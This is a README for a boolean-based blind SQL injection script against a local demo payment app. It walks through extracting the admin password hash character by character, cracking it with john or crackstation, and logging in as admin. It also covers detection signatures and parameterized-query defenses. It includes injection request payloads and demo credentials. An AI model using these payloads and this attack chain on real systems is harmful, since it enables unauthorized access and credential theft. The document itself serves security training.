# Blind SQL Injection Exploit Script

## Overview

This script demonstrates automated exploitation of the blind SQL injection vulnerability in the payment status page. It extracts the admin user's password hash character by character using boolean-based blind SQL injection.

## How It Works

The script exploits the vulnerability by:
1. Logging in as a regular user (alice)
2. Verifying the SQL injection vulnerability exists
3. Using boolean TRUE/FALSE responses to extract data:
   - **TRUE**: Payment details are displayed
   - **FALSE**: "Payment Not Found" message appears
4. Testing each character of the password hash sequentially
5. Building the complete hash character by character

## Prerequisites

```bash
# Install required Python package
pip install requests

# Or if using the virtual environment:
source .venv/bin/activate
pip install requests
```

## Usage

### Basic Usage

```bash
# Make the script executable
chmod +x exploit_blind_sqli.py

# Run the exploit
python3 exploit_blind_sqli.py
```

### Expected Output

```
======================================================================
  BLIND SQL INJECTION - Password Hash Extractor
  Target: Payment Status Page
  For Educational Purposes Only!
======================================================================

[*] Logging in as alice...
[+] Successfully logged in as alice

[*] Verifying blind SQL injection vulnerability...
[+] TRUE condition test passed (1=1)
[+] FALSE condition test passed (1=2)
[+] Vulnerability confirmed!

[*] Checking if user 'admin' exists...
[+] User 'admin' exists in database

[*] Checking if 'admin' has admin privileges...
[+] User 'admin' has admin privileges!

[*] Extracting email domain for 'admin'...
[+] Email domain: @typo-payments.com

[*] Determining password hash length for 'admin'...
[+] Password hash length: 32 characters

[*] Extracting password hash for 'admin'...
[*] This may take a few minutes...

[+] Position 1/32: c | Hash so far: c
[+] Position 2/32: 5 | Hash so far: c5
[+] Position 3/32: 3 | Hash so far: c53
[+] Position 4/32: e | Hash so far: c53e
...
[+] Position 32/32: 0 | Hash so far: c53e479b03b3220d3d56da88c4cace20

======================================================================
[+] SUCCESS! Extracted password hash for 'admin':
[+] Hash: c53e479b03b3220d3d56da88c4cace20
======================================================================

[*] Next steps:
    1. Crack the hash at: https://crackstation.net/
    2. Or use: echo 'c53e479b03b3220d3d56da88c4cace20' | john --format=Raw-MD5 --stdin
    3. Then login as 'admin' with the cracked password

[+] Hash saved to: extracted_hash.txt
```

## Performance

- **Per character**: ~16 requests (average, 0-f hex chars)
- **Complete hash (32 chars)**: ~512 requests
- **Total time**: 2-5 minutes (depending on network latency)

## Customization

You can modify the script to target different users or scenarios:

```python
# Change target user (line 18)
TARGET_USER = "admin"  # Change to "alice" or "bob"

# Change login credentials (lines 15-16)
USERNAME = "alice"
PASSWORD = "Welcome123!"

# Change base URL if running on different host (line 11)
BASE_URL = "http://localhost:5000"
```

## Attack Chain Demo

### Step 1: Run the exploit
```bash
python3 exploit_blind_sqli.py
```

### Step 2: Crack the extracted hash
```bash
# Visit https://crackstation.net/
# Paste the hash: c53e479b03b3220d3d56da88c4cace20
# Result: P@$$w0rd
```

### Step 3: Login as admin
```
Username: admin
Password: P@$$w0rd
```

### Step 4: Full compromise
You now have admin access to the application!

## What This Demonstrates

1. **Automated exploitation** - How attackers use scripts to extract data
2. **Blind SQL injection** - Extracting data without error messages
3. **Boolean-based attacks** - Using TRUE/FALSE signals
4. **Hash extraction** - Getting password hashes from the database
5. **Complete attack chain** - From SQLi → Hash → Crack → Access

## Detection

This exploit generates distinctive patterns:

### Request Patterns
```
GET /status?id=1 AND (SELECT SUBSTRING(password_hash, 1, 1) FROM users WHERE username='admin') = 'a'
GET /status?id=1 AND (SELECT SUBSTRING(password_hash, 1, 1) FROM users WHERE username='admin') = 'b'
GET /status?id=1 AND (SELECT SUBSTRING(password_hash, 1, 1) FROM users WHERE username='admin') = 'c'
...
```

### Detection Signatures
- Sequential requests with similar patterns
- SQL keywords in URL parameters (SELECT, SUBSTRING, FROM, WHERE)
- Testing multiple characters (a-f, 0-9) at same position
- High volume of status page requests (500+ in short time)

## Defense

### Fix the Vulnerability
```python
# SECURE: Use parameterized queries
query = "SELECT * FROM payments WHERE user_id = %s AND id = %s"
cursor.execute(query, (current_user.id, payment_id))
```

### Additional Protections
1. **Input Validation**: Ensure payment_id is numeric only
2. **Rate Limiting**: Limit requests per user per minute
3. **WAF Rules**: Block SQL injection patterns
4. **Monitoring**: Alert on suspicious patterns
5. **Least Privilege**: Database user with minimal permissions

## Educational Use

This script is for:
- ✅ Security training and education
- ✅ Demonstrating SQL injection risks
- ✅ Testing your own applications
- ✅ Security awareness presentations

This script is NOT for:
- ❌ Attacking systems you don't own
- ❌ Unauthorized access attempts
- ❌ Malicious purposes

## Troubleshooting

### "Login failed!"
- Verify alice's credentials: `alice` / `Welcome123!`
- Check if the application is running at http://localhost:5000
- Ensure database is initialized with demo users

### "Vulnerability confirmation failed"
- Check if you can access /status page while logged in
- Verify the blind SQLi vulnerability is present
- Check application logs for errors

### "Could not determine hash length"
- Database may not have the target user
- SQL injection may be blocked
- Check network connectivity

### "Hash extraction failed"
- Network issues or timeouts
- WAF/rate limiting blocking requests
- Verify the hash characters (should be hex: 0-9, a-f)

## Files Generated

- `extracted_hash.txt` - Contains username and extracted hash

## License

For educational purposes only. Use responsibly and ethically.
